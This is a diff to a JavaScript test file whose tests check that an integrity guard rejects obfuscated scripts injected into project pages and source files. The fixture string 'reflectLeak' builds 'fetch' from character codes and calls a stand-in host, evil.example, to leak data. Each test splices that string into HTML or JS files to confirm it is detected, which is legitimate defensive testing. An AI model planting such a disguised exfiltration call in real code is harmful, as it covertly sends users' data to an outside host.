@@ -119,6 +119,7 @@ test('cryptographic pins reject decoys, indirect calls and post-literal payload 
 test('exact surface closures reject newly introduced obfuscated executables', async () => {
   const reflectLeak = "Reflect.get(globalThis,String.fromCharCode(102,101,116,99,104))('https://evil.example/leak')";
   await expectHold(async (root) => mutate(root, 'buscar/index.html', (source) => source.replace('</body>', `<script>${reflectLeak}</script></body>`)), /pinned measurement file changed|dependency set changed/);
+  await expectHold(async (root) => mutate(root, 'src/search-multi-need-resolver.js', (source) => `${source}\n${reflectLeak};`), /pinned measurement file changed: src\/search-multi-need-resolver\.js/);
   await expectHold(async (root) => {
     await writeFile(path.join(root, 'evil.js'), reflectLeak);
     await mutate(root, 'ayuda-urgente.html', (source) => source.replace('</body>', '<script src="/evil.js"></script></body>'));
